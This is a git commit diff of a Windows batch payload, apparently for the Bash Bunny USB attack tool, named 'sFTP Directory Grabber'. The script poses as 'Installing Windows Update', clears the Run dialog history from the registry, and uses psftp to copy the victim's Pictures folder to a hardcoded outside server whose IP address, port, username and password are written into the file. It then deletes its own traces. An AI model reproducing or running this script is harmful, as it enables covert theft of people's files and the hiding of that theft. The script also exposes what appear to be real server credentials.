e4596f6b56a7a73c8281f221a9fc91db1c539199
bobstay <bobstay21@hotmail.com>
2019-08-20 19:46:32 +0200

    Add files via upload

--- payloads/library/sFTP Directory Grabber/e.cmd
+++ payloads/library/sFTP Directory Grabber/e.cmd
@@ -1,31 +1,37 @@
-@echo off
+﻿@echo off
 @echo Installing Windows Update
 
 REM Delete registry keys storing Run dialog history
+rem mettre des guillemets pour le mot de passe !
+rem mettre une redirection > C:\Temp\test.txt pour debug
 REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
-SET sftphost=username@hostname.domain.com
-SET sftppass=password
-SET lootfrom=%userprofile%\Documents
-SET looto=/loot
+SET sftphost=185.178.48.116
+SET sftpuser=userftp
+SET sftppass="18^2zg98yt"
+SET sftpport=31569
+SET lootfrom=%userprofile%\Pictures
+SET looto=/ftp
 SET unique=%RANDOM%
-REM Create FTP script
+REM Creation du ftp
 @echo lcd "%lootfrom%" >%TEMP%\test2.txt
 @echo cd "%looto%" >>%TEMP%\test2.txt
 @echo mkdir %computername%_%unique% >>%TEMP%\test2.txt
 @echo cd %computername%_%unique% >>%TEMP%\test2.txt
 @echo mput -r *. >>%TEMP%\test2.txt
 @echo quit >>%TEMP%\test2.txt
-REM Below is for copying a directory with a payload inside the root directory of the Bash Bunny USB Mass Storage.
+REM Vous trouverez ci-dessous la copie d’un répertoire contenant une charge dans le répertoire racine du périphérique de stockage de masse Bash Bunny USB.
 REM echo d | xcopy /C /Q /Y /E %~dp0\..\..\PAYLOAD_FOLDER_IN_ROOT %TEMP%\PAYLOAD_FOLDER_IN_ROOT
 
 REM Copy payload.exe from the root of the bash Bash Bunny USB Mass Storage (change to whatever you like).
-copy %~dp0\..\..\psftp.exe "%TEMP%\psftp.exe"
+rem le psftp.exe doit être dans \payloads\library\sFTP Directory Grabber
+copy %~dp0\psftp.exe "%TEMP%\psftp.exe"
+rem copy %~dp0\.ssh "%userprofile%"
 
 REM Below is for executing a payload inside a directory (see comments above). Change --startup to whatever parameters you wish to pass (or remove it).
 REM start "" "%TEMP%\PAYLOAD_FOLDER_IN_ROOT\payload.exe" --startup
 
 REM Launch payload.exe with the startup parameter. Change --startup to whatever parameters you wish to pass (or remove it).
-start /wait /min "" "%TEMP%\psftp.exe" -pw %sftppass% %sftphost% -b "%TEMP%\test2.txt"
+start /wait /min "" "%TEMP%\psftp.exe" %sftphost% -l %sftpuser% -P %sftpport% -pw %sftppass% -b "%TEMP%\test2.txt" < %~dp0\yes.txt
 REM Clean Up payload parameter files
 DEL %TEMP%\psftp.exe /q
 DEL %TEMP%\test2.txt /q
